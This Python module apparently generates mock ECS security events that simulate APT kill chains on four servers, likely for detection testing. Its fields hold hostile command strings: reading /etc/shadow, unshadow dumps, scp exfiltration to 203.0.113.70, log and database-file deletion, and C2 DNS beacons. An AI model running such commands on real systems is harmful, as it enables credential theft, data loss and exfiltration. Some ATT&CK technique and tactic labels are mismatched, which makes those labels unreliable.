"""
APT 攻击数据生成器（基于完整 KillChain 攻击链条）

为 4 个模拟客户机生成符合 ECS v9.2.0 规范的 APT 攻击事件数据。
参考 backend/tests/fixtures/graph/testExample.json 的攻击链条设计。

攻击链条阶段：
1. TA0001 (Initial Access): 初始访问
2. TA0002 (Execution): 执行
3. TA0003 (Persistence): 持久化
4. TA0004 (Privilege Escalation): 提权
5. TA0005 (Defense Evasion): 防御规避
6. TA0006 (Credential Access): 凭证访问
7. TA0007 (Discovery): 侦察
8. TA0008 (Lateral Movement): 横向移动
9. TA0009 (Collection): 收集
10. TA0010 (Exfiltration): 数据外传
11. TA0011 (Command and Control): 命令与控制

数据集命名规范（ECS 标准）：
- hostlog.auth: 认证日志
- hostlog.process: 进程日志
- hostbehavior.file: 文件行为
- netflow.dns: DNS 流量
- netflow.flow: 网络流量
- finding.canonical: 归一化告警
"""

import hashlib
from datetime import datetime, timezone, timedelta
from typing import Dict, List
import uuid


def generate_uuid_id(prefix: str) -> str:
    """生成符合 ECS 规范的 ID（UUID）"""
    return f"{prefix}-{uuid.uuid4().hex[:16]}"


def generate_event_id(raw_data: str) -> str:
    """生成符合 ECS 规范的 event.id（SHA1 hash）"""
    sha1_hash = hashlib.sha1(raw_data.encode('utf-8')).hexdigest()
    return f"evt-{sha1_hash[:16]}"


def generate_base_event(
    host_id: str,
    host_name: str,
    event_dataset: str,
    event_kind: str = "event",
    event_category: List[str] = None,
    event_type: List[str] = None,
    agent_type: str = "mock-client",
    timestamp: datetime = None,
    message: str = ""
) -> Dict:
    """生成基础 ECS 事件（参考 testExample.json 的格式）"""
    if timestamp is None:
        timestamp = datetime.now(timezone.utc)

    # 根据 event.dataset 推断 event.category 和 event.type
    if event_category is None:
        if event_dataset == "hostlog.auth":
            event_category = ["authentication"]
            event_type = ["start"]
        elif event_dataset == "hostlog.process":
            event_category = ["process"]
            event_type = ["start"]
        elif event_dataset == "hostbehavior.file":
            event_category = ["file"]
            event_type = ["access"]
        elif event_dataset == "netflow.dns":
            event_category = ["network"]
            event_type = ["info"]
        elif event_dataset == "netflow.flow":
            event_category = ["network"]
            event_type = ["start"]
        else:
            event_category = ["other"]
            event_type = ["info"]

    event_id = generate_event_id(f"{host_id}:{event_dataset}:{timestamp}")

    base = {
        "ecs": {"version": "9.2.0"},
        "@timestamp": timestamp.isoformat(),
        "event": {
            "id": event_id,
            "kind": event_kind,
            "dataset": event_dataset,
            "category": event_category,
            "type": event_type,
            "created": timestamp.isoformat(),
            "ingested": datetime.now(timezone.utc).isoformat(),
            "original": f"raw: simulated event",
        },
        "host": {
            "id": generate_uuid_id("h"),
            "name": host_name,
            "ip": [f"10.0.0.{10 + ['web-01', 'db-01', 'file-01', 'pivot-01'].index(host_name)}"]
        },
        "agent": {
            "type": agent_type,
            "name": f"mock-{host_id}",
            "id": f"agent-{host_id}",
        },
        "message": message,
    }

    return base


def add_threat_fields(event: Dict, tactic_id: str, technique_id: str, tactic_name: str = "") -> Dict:
    """添加 MITRE ATT&CK 字段"""
    if "threat" not in event:
        event["threat"] = {}

    tactic_reference = f"https://attack.mitre.org/tactics/{tactic_id}"

    event["threat"]["framework"] = "MITRE ATT&CK"
    event["threat"]["tactic"] = {
        "id": tactic_id,
        "name": tactic_name or tactic_id,
        "reference": tactic_reference
    }

    event["threat"]["technique"] = [{
        "id": technique_id,
        "name": technique_id,
        "reference": f"https://attack.mitre.org/techniques/{technique_id.replace('.', '/')}"
    }]

    return event


def generate_finding_event(
    host_id: str,
    host_name: str,
    timestamp: datetime,
    tactic_id: str,
    technique_id: str,
    tactic_name: str,
    message: str
) -> Dict:
    """生成 finding.canonical 事件（分析后的告警）"""
    event = generate_base_event(
        host_id, host_name, "finding.canonical",
        event_kind="alert",
        event_category=["threat"],
        event_type=["alert"],
        timestamp=timestamp,
        message=message
    )

    event["event"]["severity"] = 50  # Medium severity
    event["event"]["risk_score"] = 50

    event = add_threat_fields(event, tactic_id, technique_id, tactic_name)

    return event


def generate_web_server_attacks() -> Dict[str, List[Dict]]:
    """
    客户机 1：Web 服务器 APT 攻击场景（完整 KillChain 链条）

    攻击时间跨度：2 小时
    攻击链条：
    - TA0001: SQL 注入初始访问
    - TA0002: Webshell 执行
    - TA0003: 后门植入（持久化）
    - TA0004: 提权到 root
    - TA0005: 清除日志（防御规避）
    - TA0007: 侦察系统信息
    - TA0009: 窃取数据库凭证
    - TA0011: 连接 C2 服务器
    """
    host_id = "web-server-001"
    host_name = "web-01"
    base_time = datetime.now(timezone.utc) - timedelta(hours=2)

    falco_events = []
    filebeat_events = []
    suricata_events = []
    findings = []

    # ==================== TA0001: 初始访问（SQL 注入）====================
    # 时间: T+00:00:00
    ts = base_time
    event = generate_base_event(host_id, host_name, "netflow.flow", timestamp=ts,
                                message="SQL injection attack detected")
    event.update({
        "source": {"ip": "203.0.113.50", "port": 54321},
        "destination": {"ip": "10.0.0.10", "port": 80},
        "network": {"transport": "tcp", "protocol": "http"}
    })
    event = add_threat_fields(event, "TA0001", "T1190", "Initial Access")
    suricata_events.append(event)

    # ==================== TA0002: 执行（Webshell）====================
    # 时间: T+00:05:00 (5分钟后)
    ts = base_time + timedelta(minutes=5)
    event = generate_base_event(host_id, host_name, "hostlog.process", timestamp=ts,
                                message="Webshell process executed")
    event.update({
        "process": {
            "pid": 1234,
            "executable": "/usr/bin/php",
            "entity_id": generate_uuid_id("p"),
            "command_line": "php /var/www/html/uploads/shell.php",
            "name": "php"
        },
        "user": {"name": "www-data", "id": "33"},
        "event": {"action": "process_start", **event["event"]}
    })
    event = add_threat_fields(event, "TA0002", "T1505.003", "Execution")
    falco_events.append(event)

    # Webshell 执行命令
    ts = base_time + timedelta(minutes=6)
    event = generate_base_event(host_id, host_name, "hostlog.process", timestamp=ts,
                                message="Suspicious command executed via webshell")
    event.update({
        "process": {
            "pid": 1235,
            "executable": "/bin/bash",
            "entity_id": generate_uuid_id("p"),
            "command_line": "whoami && uname -a && cat /etc/passwd",
            "parent": {"pid": 1234, "executable": "/usr/bin/php"},
            "name": "bash"
        },
        "user": {"name": "www-data", "id": "33"}
    })
    event = add_threat_fields(event, "TA0002", "T1059.004", "Execution")
    falco_events.append(event)

    # ==================== TA0003: 持久化（后门植入）====================
    # 时间: T+00:15:00
    ts = base_time + timedelta(minutes=15)
    event = generate_base_event(host_id, host_name, "hostbehavior.file", timestamp=ts,
                                message="Backdoor file created")
    event.update({
        "process": {"pid": 1234, "executable": "/usr/bin/php"},
        "file": {
            "path": "/var/www/html/uploads/backdoor.php",
            "mime_type": "text/x-php",
            "size": 2048,
            "action": "created"
        },
        "event": {"action": "file_create", **event["event"]}
    })
    event = add_threat_fields(event, "TA0003", "T1505.003", "Persistence")
    falco_events.append(event)

    # ==================== TA0004: 提权（Sudoers 修改）====================
    # 时间: T+00:30:00
    ts = base_time + timedelta(minutes=30)
    event = generate_base_event(host_id, host_name, "hostlog.process", timestamp=ts,
                                message="Privilege escalation via sudo")
    event.update({
        "process": {
            "pid": 1240,
            "executable": "/usr/bin/sudo",
            "entity_id": generate_uuid_id("p"),
            "command_line": "sudo su -",
            "parent": {"pid": 1234, "executable": "/usr/bin/php"},
            "name": "sudo"
        },
        "user": {
            "name": "www-data",
            "id": "33",
            "effective": {"name": "root", "id": "0"}
        }
    })
    event = add_threat_fields(event, "TA0004", "T1548.003", "Privilege Escalation")
    falco_events.append(event)

    # 修改 sudoers 文件
    ts = base_time + timedelta(minutes=31)
    event = generate_base_event(host_id, host_name, "hostbehavior.file", timestamp=ts,
                                message="Sudoers file modified for persistence")
    event.update({
        "process": {"pid": 1240, "executable": "/usr/bin/sudo"},
        "file": {
            "path": "/etc/sudoers",
            "action": "modified",
            "size": 512
        },
        "event": {"action": "file_modify", **event["event"]}
    })
    event = add_threat_fields(event, "TA0003", "T1056.001", "Persistence")
    falco_events.append(event)

    # ==================== TA0005: 防御规避（清除日志）====================
    # 时间: T+00:45:00
    ts = base_time + timedelta(minutes=45)
    event = generate_base_event(host_id, host_name, "hostbehavior.file", timestamp=ts,
                                message="Log file cleared")
    event.update({
        "process": {
            "pid": 1250,
            "executable": "/bin/rm",
            "command_line": "rm -f /var/log/apache2/access.log"
        },
        "file": {
            "path": "/var/log/apache2/access.log",
            "action": "deleted"
        },
        "event": {"action": "file_delete", **event["event"]}
    })
    event = add_threat_fields(event, "TA0005", "T1070.004", "Defense Evasion")
    falco_events.append(event)

    # ==================== TA0007: 侦察（系统信息收集）====================
    # 时间: T+01:00:00
    ts = base_time + timedelta(hours=1)
    event = generate_base_event(host_id, host_name, "hostlog.process", timestamp=ts,
                                message="System reconnaissance via system commands")
    event.update({
        "process": {
            "pid": 1260,
            "executable": "/usr/bin/uname",
            "command_line": "uname -a",
            "name": "uname"
        },
        "user": {"name": "root", "id": "0"}
    })
    event = add_threat_fields(event, "TA0007", "T1082", "Discovery")
    falco_events.append(event)

    # ==================== TA0009: 收集（数据库凭证窃取）====================
    # 时间: T+01:15:00
    ts = base_time + timedelta(hours=1, minutes=15)
    event = generate_base_event(host_id, host_name, "hostbehavior.file", timestamp=ts,
                                message="Database configuration file accessed")
    event.update({
        "process": {
            "pid": 1270,
            "executable": "/bin/cat",
            "command_line": "cat /var/www/html/config/database.php"
        },
        "file": {
            "path": "/var/www/html/config/database.php",
            "size": 1024,
            "action": "accessed"
        },
        "event": {"action": "file_access", **event["event"]}
    })
    event = add_threat_fields(event, "TA0009", "T1005", "Collection")
    falco_events.append(event)

    # ==================== TA0011: 命令与控制（C2 连接）====================
    # 时间: T+01:30:00 (多次 beacon)
    for i in range(5):
        ts = base_time + timedelta(hours=1, minutes=30, seconds=i*30)
        event = generate_base_event(host_id, host_name, "netflow.dns", timestamp=ts,
                                    message=f"DNS beacon to C2 server #{i+1}")
        event.update({
            "source": {"ip": "10.0.0.10", "port": 54322},
            "destination": {"ip": "10.0.0.2", "port": 53},
            "dns": {
                "question": {
                    "name": f"beacon{i+1}.c2-evil.com",
                    "type": "A",
                    "class": "IN"
                }
            },
            "network": {"transport": "udp", "protocol": "dns"}
        })
        event = add_threat_fields(event, "TA0011", "T1071.004", "Command and Control")
        suricata_events.append(event)

    # ==================== Finding Events（分析告警）====================
    findings.append(generate_finding_event(
        host_id, host_name, base_time + timedelta(minutes=1),
        "TA0001", "T1190", "Initial Access",
        "Initial Access detected via SQL injection"
    ))
    findings.append(generate_finding_event(
        host_id, host_name, base_time + timedelta(minutes=10),
        "TA0002", "T1505.003", "Execution",
        "Execution detected via webshell"
    ))
    findings.append(generate_finding_event(
        host_id, host_name, base_time + timedelta(minutes=35),
        "TA0004", "T1548.003", "Privilege Escalation",
        "Privilege escalation detected via sudo abuse"
    ))
    findings.append(generate_finding_event(
        host_id, host_name, base_time + timedelta(hours=1, minutes=40),
        "TA0011", "T1071.004", "Command and Control",
        "Command and Control detected via DNS beaconing"
    ))

    return {
        "falco": falco_events,
        "filebeat": filebeat_events,
        "suricata": suricata_events,
        "findings": findings
    }


def generate_db_server_attacks() -> Dict[str, List[Dict]]:
    """
    客户机 2：数据库服务器 APT 攻击场景

    攻击时间跨度：1.5 小时
    攻击链条：
    - TA0001: SSH 暴力破解
    - TA0006: 转储用户哈希
    - TA0002: 执行恶意 SQL
    - TA0009: 导出敏感数据
    - TA0010: 数据库删除
    """
    host_id = "db-server-001"
    host_name = "db-01"
    base_time = datetime.now(timezone.utc) - timedelta(hours=1, minutes=30)

    falco_events = []
    filebeat_events = []
    suricata_events = []
    findings = []

    # ==================== TA0001: 初始访问（SSH 暴力破解）====================
    # 多次失败登录
    for i in range(5):
        ts = base_time + timedelta(seconds=i*5)
        event = generate_base_event(host_id, host_name, "hostlog.auth", timestamp=ts,
                                    message=f"Failed SSH login attempt #{i+1}")
        event.update({
            "source": {"ip": "203.0.113.60"},
            "destination": {"ip": "10.0.0.20", "port": 22},
            "user": {"name": "admin"},
            "session": {"id": generate_uuid_id("sess")},
            "event": {"action": "user_login", "outcome": "failure", **event["event"]}
        })
        event = add_threat_fields(event, "TA0001", "T1110.001", "Initial Access")
        filebeat_events.append(event)

    # 成功登录
    ts = base_time + timedelta(seconds=30)
    event = generate_base_event(host_id, host_name, "hostlog.auth", timestamp=ts,
                                message="Successful SSH login after brute force")
    event.update({
        "source": {"ip": "203.0.113.60"},
        "destination": {"ip": "10.0.0.20", "port": 22},
        "user": {"name": "admin"},
        "session": {"id": generate_uuid_id("sess")},
        "event": {"action": "user_login", "outcome": "success", **event["event"]}
    })
    event = add_threat_fields(event, "TA0001", "T1078", "Initial Access")
    filebeat_events.append(event)

    # ==================== TA0006: 凭证访问（转储哈希）====================
    # 时间: T+00:10:00
    ts = base_time + timedelta(minutes=10)
    event = generate_base_event(host_id, host_name, "hostlog.process", timestamp=ts,
                                message="Credential dumping tool executed")
    event.update({
        "process": {
            "pid": 2340,
            "executable": "/usr/bin/unshadow",
            "command_line": "unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt",
            "name": "unshadow"
        },
        "user": {"name": "root", "id": "0"}
    })
    event = add_threat_fields(event, "TA0006", "T1003.003", "Credential Access")
    falco_events.append(event)

    # ==================== TA0002: 执行（恶意 SQL）====================
    # 时间: T+00:20:00
    ts = base_time + timedelta(minutes=20)
    event = generate_base_event(host_id, host_name, "hostlog.process", timestamp=ts,
                                message="Malicious SQL query executed")
    event.update({
        "process": {
            "pid": 2345,
            "executable": "/usr/bin/mysql",
            "entity_id": generate_uuid_id("p"),
            "command_line": 'mysql -u root -e "SELECT * FROM users; UPDATE users SET password=\'hacked\' WHERE id=1;"',
            "name": "mysql"
        },
        "user": {"name": "admin", "id": "1000"},
        "database": {"name": "production_db"}
    })
    event = add_threat_fields(event, "TA0002", "T1055", "Execution")
    falco_events.append(event)

    # ==================== TA0009: 收集（数据导出）====================
    # 时间: T+00:30:00
    ts = base_time + timedelta(minutes=30)
    event = generate_base_event(host_id, host_name, "hostbehavior.file", timestamp=ts,
                                message="Database dump created for exfiltration")
    event.update({
        "process": {
            "pid": 2350,
            "executable": "/usr/bin/mysqldump",
            "command_line": "mysqldump -u root -p production_db > /tmp/backup.sql"
        },
        "file": {
            "path": "/tmp/backup.sql",
            "size": 10240000,
            "action": "created"
        },
        "event": {"action": "file_create", **event["event"]}
    })
    event = add_threat_fields(event, "TA0009", "T1005", "Collection")
    falco_events.append(event)

    # ==================== TA0010: 影响（数据删除）====================
    # 时间: T+01:00:00
    ts = base_time + timedelta(hours=1)
    event = generate_base_event(host_id, host_name, "hostbehavior.file", timestamp=ts,
                                message="Critical database file deleted")
    event.update({
        "process": {
            "pid": 2355,
            "executable": "/bin/rm",
            "command_line": "rm -f /var/lib/mysql/production_db/users.ibd"
        },
        "file": {
            "path": "/var/lib/mysql/production_db/users.ibd",
            "action": "deleted"
        },
        "event": {"action": "file_delete", **event["event"]}
    })
    event = add_threat_fields(event, "TA0010", "T1565.001", "Impact")
    falco_events.append(event)

    # ==================== Finding Events ====================
    findings.append(generate_finding_event(
        host_id, host_name, base_time + timedelta(seconds=35),
        "TA0001", "T1110.001", "Initial Access",
        "Initial Access detected via SSH brute force"
    ))
    findings.append(generate_finding_event(
        host_id, host_name, base_time + timedelta(minutes=15),
        "TA0006", "T1003.003", "Credential Access",
        "Credential access detected via password dumping"
    ))
    findings.append(generate_finding_event(
        host_id, host_name, base_time + timedelta(hours=1, minutes=5),
        "TA0010", "T1565.001", "Impact",
        "Impact detected via critical data deletion"
    ))

    return {
        "falco": falco_events,
        "filebeat": filebeat_events,
        "suricata": suricata_events,
        "findings": findings
    }


def generate_file_server_attacks() -> Dict[str, List[Dict]]:
    """
    客户机 3：文件服务器 APT 攻击场景

    攻击时间跨度：2 小时
    攻击链条：
    - TA0001: FTP 暴力破解
    - TA0002: 上传恶意文件
    - TA0003: Crontab 持久化
    - TA0009: 大规模数据窃取
    - TA0005: 清除访问日志
    """
    host_id = "file-server-001"
    host_name = "file-01"
    base_time = datetime.now(timezone.utc) - timedelta(hours=2)

    falco_events = []
    filebeat_events = []
    suricata_events = []
    findings = []

    # ==================== TA0001: 初始访问（FTP 暴力破解）====================
    for i in range(4):
        ts = base_time + timedelta(seconds=i*5)
        event = generate_base_event(host_id, host_name, "hostlog.auth", timestamp=ts,
                                    message=f"Failed FTP login attempt #{i+1}")
        event.update({
            "source": {"ip": "203.0.113.70"},
            "destination": {"ip": "10.0.0.30", "port": 21},
            "user": {"name": "ftpuser"},
            "session": {"id": generate_uuid_id("sess")},
            "event": {"action": "user_login", "outcome": "failure", **event["event"]}
        })
        event = add_threat_fields(event, "TA0001", "T1110.001", "Initial Access")
        filebeat_events.append(event)

    # 成功登录
    ts = base_time + timedelta(seconds=25)
    event = generate_base_event(host_id, host_name, "hostlog.auth", timestamp=ts,
                                message="Successful FTP login")
    event.update({
        "source": {"ip": "203.0.113.70"},
        "destination": {"ip": "10.0.0.30", "port": 21},
        "user": {"name": "ftpuser"},
        "session": {"id": generate_uuid_id("sess")},
        "event": {"action": "user_login", "outcome": "success", **event["event"]}
    })
    event = add_threat_fields(event, "TA0001", "T1078", "Initial Access")
    filebeat_events.append(event)

    # ==================== TA0002: 执行（上传恶意文件）====================
    # 时间: T+00:05:00
    ts = base_time + timedelta(minutes=5)
    event = generate_base_event(host_id, host_name, "hostbehavior.file", timestamp=ts,
                                message="Malicious Python script uploaded via FTP")
    event.update({
        "process": {"pid": 3456, "executable": "/usr/bin/vsftpd"},
        "file": {
            "path": "/home/ftpuser/uploads/malicious.py",
            "mime_type": "text/x-python",
            "size": 4096,
            "action": "created"
        },
        "source": {"ip": "203.0.113.70"},
        "user": {"name": "ftpuser", "id": "1001"},
        "event": {"action": "file_create", **event["event"]}
    })
    event = add_threat_fields(event, "TA0002", "T1505.003", "Execution")
    falco_events.append(event)

    # ==================== TA0003: 持久化（Crontab）====================
    # 时间: T+00:15:00
    ts = base_time + timedelta(minutes=15)
    event = generate_base_event(host_id, host_name, "hostbehavior.file", timestamp=ts,
                                message="Crontab modified for persistence")
    event.update({
        "process": {
            "pid": 3460,
            "executable": "/usr/bin/crontab",
            "command_line": "crontab -e"
        },
        "file": {
            "path": "/var/spool/cron/crontabs/root",
            "action": "modified",
            "size": 256
        },
        "user": {"name": "root", "id": "0"},
        "event": {"action": "file_modify", **event["event"]}
    })
    event = add_threat_fields(event, "TA0003", "T1053.003", "Persistence")
    falco_events.append(event)

    # ==================== TA0009: 收集（大规模数据窃取）====================
    # 时间: T+00:30:00 (多次文件传输)
    for i in range(4):
        ts = base_time + timedelta(minutes=30, seconds=i*10)
        event = generate_base_event(host_id, host_name, "hostlog.process", timestamp=ts,
                                    message=f"SCP exfiltration of sensitive file #{i+1}")
        event.update({
            "process": {
                "pid": 3465 + i,
                "executable": "/usr/bin/scp",
                "command_line": f"scp /data/sensitive/file_{i}.txt 203.0.113.70:/tmp/",
                "name": "scp"
            },
            "file": {
                "path": f"/data/sensitive/file_{i}.txt",
                "size": 102400 * (i + 1)
            },
            "destination": {"ip": "203.0.113.70"},
            "user": {"name": "ftpuser", "id": "1001"}
        })
        event = add_threat_fields(event, "TA0009", "T1041", "Collection")
        falco_events.append(event)

    # ==================== TA0005: 防御规避（清除日志）====================
    # 时间: T+01:30:00
    ts = base_time + timedelta(hours=1, minutes=30)
    event = generate_base_event(host_id, host_name, "hostbehavior.file", timestamp=ts,
                                message="FTP access log cleared")
    event.update({
        "process": {
            "pid": 3470,
            "executable": "/bin/rm",
            "command_line": "rm -f /var/log/vsftpd.log"
        },
        "file": {
            "path": "/var/log/vsftpd.log",
            "action": "deleted"
        },
        "event": {"action": "file_delete", **event["event"]}
    })
    event = add_threat_fields(event, "TA0005", "T1070.004", "Defense Evasion")
    falco_events.append(event)

    # ==================== Finding Events ====================
    findings.append(generate_finding_event(
        host_id, host_name, base_time + timedelta(seconds=30),
        "TA0001", "T1110.001", "Initial Access",
        "Initial Access detected via FTP brute force"
    ))
    findings.append(generate_finding_event(
        host_id, host_name, base_time + timedelta(minutes=20),
        "TA0003", "T1053.003", "Persistence",
        "Persistence detected via crontab modification"
    ))
    findings.append(generate_finding_event(
        host_id, host_name, base_time + timedelta(hours=1, minutes=35),
        "TA0009", "T1041", "Collection",
        "Collection detected via large-scale data exfiltration"
    ))

    return {
        "falco": falco_events,
        "filebeat": filebeat_events,
        "suricata": suricata_events,
        "findings": findings
    }


def generate_pivot_server_attacks() -> Dict[str, List[Dict]]:
    """
    客户机 4：内网跳板机 APT 攻击场景

    攻击时间跨度：2.5 小时
    攻击链条：
    - TA0007: 侦察活动（端口扫描）
    - TA0008: 横向移动（SSH 跳转）
    - TA0006: 转储其他主机凭证
    - TA0008: 进一步横向移动
    - TA0011: DNS 隧道 C2
    """
    host_id = "pivot-server-001"
    host_name = "pivot-01"
    base_time = datetime.now(timezone.utc) - timedelta(hours=2, minutes=30)

    falco_events = []
    filebeat_events = []
    suricata_events = []
    findings = []

    # ==================== TA0007: 侦察（内网扫描）====================
    # ICMP Ping 扫描
    for i in range(5):
        ts = base_time + timedelta(seconds=i*2)
        event = generate_base_event(host_id, host_name, "netflow.flow", timestamp=ts,
                                    message=f"Internal network ping scan to 10.0.0.{100+i}")
        event.update({
            "source": {"ip": "10.0.0.40"},
            "destination": {"ip": f"10.0.0.{100+i}", "port": 0},
            "network": {"transport": "icmp", "protocol": "icmp"}
        })
        event = add_threat_fields(event, "TA0007", "T1018", "Discovery")
        suricata_events.append(event)

    # ==================== TA0007: 侦察（Nmap 端口扫描）====================
    # 时间: T+00:01:00
    ts = base_time + timedelta(minutes=1)
    event = generate_base_event(host_id, host_name, "hostlog.process", timestamp=ts,
                                message="Network reconnaissance via nmap")
    event.update({
        "process": {
            "pid": 4567,
            "executable": "/usr/bin/nmap",
            "entity_id": generate_uuid_id("p"),
            "command_line": "nmap -sS -p 22,80,443,3306 10.0.0.0/24",
            "name": "nmap"
        },
        "user": {"name": "attacker", "id": "1000"}
    })
    event = add_threat_fields(event, "TA0007", "T1018", "Discovery")
    falco_events.append(event)

    # ==================== TA0008: 横向移动（SSH 跳转）====================
    # 连接到 victim-01 (10.0.0.10)
    ts = base_time + timedelta(minutes=10)
    event = generate_base_event(host_id, host_name, "hostlog.auth", timestamp=ts,
                                message="Lateral movement via SSH to victim-01")
    event.update({
        "source": {"ip": "10.0.0.40"},
        "destination": {"ip": "10.0.0.10", "port": 22},
        "user": {"name": "attacker"},
        "session": {"id": generate_uuid_id("sess")},
        "event": {"action": "user_login", "outcome": "success", **event["event"]}
    })
    event = add_threat_fields(event, "TA0008", "T1021.001", "Lateral Movement")
    filebeat_events.append(event)

    # 连接到 victim-02 (10.0.0.20)
    ts = base_time + timedelta(minutes=30)
    event = generate_base_event(host_id, host_name, "hostlog.auth", timestamp=ts,
                                message="Lateral movement via SSH to victim-02")
    event.update({
        "source": {"ip": "10.0.0.40"},
        "destination": {"ip": "10.0.0.20", "port": 22},
        "user": {"name": "attacker"},
        "session": {"id": generate_uuid_id("sess")},
        "event": {"action": "user_login", "outcome": "success", **event["event"]}
    })
    event = add_threat_fields(event, "TA0008", "T1021.001", "Lateral Movement")
    filebeat_events.append(event)

    # ==================== TA0006: 凭证访问（转储其他主机凭证）====================
    # 时间: T+01:00:00
    ts = base_time + timedelta(hours=1)
    event = generate_base_event(host_id, host_name, "hostlog.process", timestamp=ts,
                                message="Password hash dumping from compromised host")
    event.update({
        "process": {
            "pid": 4580,
            "executable": "/bin/cat",
            "command_line": "cat /etc/shadow",
            "name": "cat"
        },
        "user": {"name": "root", "id": "0"}
    })
    event = add_threat_fields(event, "TA0006", "T1003.003", "Credential Access")
    falco_events.append(event)

    # ==================== TA0008: 进一步横向移动====================
    # 时间: T+01:30:00
    ts = base_time + timedelta(hours=1, minutes=30)
    event = generate_base_event(host_id, host_name, "hostlog.process", timestamp=ts,
                                message="SSH to another internal host")
    event.update({
        "process": {
            "pid": 4590,
            "executable": "/usr/bin/ssh",
            "command_line": "ssh admin@10.0.0.30",
            "name": "ssh"
        },
        "destination": {"ip": "10.0.0.30", "port": 22},
        "user": {"name": "attacker", "id": "1000"}
    })
    event = add_threat_fields(event, "TA0008", "T1021.001", "Lateral Movement")
    falco_events.append(event)

    # ==================== TA0011: 命令与控制（DNS 隧道）====================
    # 时间: T+02:00:00 (多次 DNS 隧道通信)
    for i in range(6):
        ts = base_time + timedelta(hours=2, seconds=i*20)
        domain = f"data{i}.evil-c2.com"
        event = generate_base_event(host_id, host_name, "netflow.dns", timestamp=ts,
                                    message=f"DNS tunneling beacon #{i+1}")
        event.update({
            "source": {"ip": "10.0.0.40", "port": 54323},
            "destination": {"ip": "10.0.0.2", "port": 53},
            "dns": {
                "question": {
                    "name": domain,
                    "type": "A",
                    "class": "IN"
                },
                "answers": [{"name": domain, "type": "CNAME", "data": "c2.evil.com"}]
            },
            "network": {"transport": "udp", "protocol": "dns"}
        })
        event = add_threat_fields(event, "TA0011", "T1071.004", "Command and Control")
        suricata_events.append(event)

    # ==================== Finding Events ====================
    findings.append(generate_finding_event(
        host_id, host_name, base_time + timedelta(seconds=15),
        "TA0007", "T1018", "Discovery",
        "Discovery detected via internal network scanning"
    ))
    findings.append(generate_finding_event(
        host_id, host_name, base_time + timedelta(minutes=40),
        "TA0008", "T1021.001", "Lateral Movement",
        "Lateral movement detected via SSH hopping"
    ))
    findings.append(generate_finding_event(
        host_id, host_name, base_time + timedelta(hours=2, minutes=5),
        "TA0011", "T1071.004", "Command and Control",
        "Command and Control detected via DNS tunneling"
    ))

    return {
        "falco": falco_events,
        "filebeat": filebeat_events,
        "suricata": suricata_events,
        "findings": findings
    }
